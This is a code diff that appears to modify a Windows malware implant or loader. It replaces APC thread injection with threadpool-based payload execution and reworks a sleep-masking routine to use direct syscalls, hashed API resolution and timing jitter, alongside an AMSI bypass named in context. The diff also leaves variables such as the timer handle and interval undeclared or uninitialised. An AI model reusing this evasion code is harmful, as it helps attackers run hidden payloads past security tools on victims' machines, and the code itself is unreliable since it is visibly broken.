@@ -258,30 +258,28 @@ static BOOL BypassAMSI_DataOnly() {
 }
 
 // =============================================================================
-// THREADLESS EXECUTION (APC INJECTION)
+// STEALTHY EXECUTION VIA THREADPOOL (Replaces APC)
 // =============================================================================
 
-static void ThreadlessExecute(PVOID pPayload) {
-    THREADENTRY32 te;
-    te.dwSize = sizeof(te);
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return;
+static BOOL QueueUserWorkItemExecute(PVOID pCode, PVOID pArgs) {
+    HMODULE hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+    if (!hKernel32) return FALSE;
+    
+    typedef BOOL(WINAPI* TpAllocWork_t)(TP_WORK**, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
+    typedef VOID(WINAPI* TpPostWork_t)(TP_WORK*);
+    typedef VOID(WINAPI* TpReleaseWork_t)(TP_WORK*);
 
-    if (Thread32First(hSnap, &te)) {
-        do {
-            if (te.th32OwnerProcessID == GetCurrentProcessId() &&
-                te.th32ThreadID != GetCurrentThreadId()) {
-                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
-                if (hThread) {
-                    InvokeSyscall(g_ApiTable.syscalls.NtQueueApcThread.ssn, g_SyscallGadget,
-                        hThread, pPayload, NULL, NULL, NULL);
-                    CloseHandle(hThread);
-                    break;
-                }
-            }
-        } while (Thread32Next(hSnap, &te));
-    }
-    CloseHandle(hSnap);
+    TpAllocWork_t pTpAllocWork = (TpAllocWork_t)ResolveApiByHash(hKernel32, HASH_TpAllocWork);
+    TpPostWork_t pTpPostWork = (TpPostWork_t)ResolveApiByHash(hKernel32, HASH_TpPostWork);
+    TpReleaseWork_t pTpReleaseWork = (TpReleaseWork_t)ResolveApiByHash(hKernel32, HASH_TpReleaseWork);
+
+    if (!pTpAllocWork || !pTpPostWork || !pTpReleaseWork) return FALSE;
+
+    TP_WORK* pWork = NULL;
+    if (!pTpAllocWork(&pWork, (PTP_WORK_CALLBACK)pCode, pArgs, NULL)) return FALSE;
+    pTpPostWork(pWork);
+    pTpReleaseWork(pWork);
+    return TRUE;
 }
 
 // =============================================================================
@@ -333,21 +331,19 @@ static void AdvancedSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
     DWORD jitter = (dwMs * 20) / 100;
     DWORD actualMs = dwMs - jitter + (GetTickCount() % (2 * jitter + 1));
 
-    HANDLE hTimer = NULL;
-    LARGE_INTEGER li;
-    li.QuadPart = -(int64_t)actualMs * 10000;
+    OBJECT_ATTRIBUTES objAttr = {0};
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
 
-    typedef HANDLE (WINAPI *CreateWaitableTimerW_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
+    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtCreateTimer2.ssn,
+        g_SyscallGadget, &hTimer, TIMER_ALL_ACCESS, &objAttr, 0, 0);
+
+    if (status != 0) return;
+
     typedef BOOL (WINAPI *SetWaitableTimer_t)(HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
-
-    CreateWaitableTimerW_t pCWT = (CreateWaitableTimerW_t)g_ApiTable.CreateWaitableTimerW;
     SetWaitableTimer_t pSWT = (SetWaitableTimer_t)g_ApiTable.SetWaitableTimer;
 
-    hTimer = pCWT(NULL, TRUE, NULL);
-    if (!hTimer) return;
-
     if (!pSWT(hTimer, &li, 0, NULL, NULL, FALSE)) {
-        CloseHandle(hTimer);
+        InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hTimer);
         return;
     }
 
@@ -390,7 +386,7 @@ static void AdvancedSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
 
     SecureWipe(sleepKey, sizeof(sleepKey));
     SecureWipe(&sleepCtx, sizeof(sleepCtx));
-    CloseHandle(hTimer);
+    InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hTimer);
 }
 
 #endif
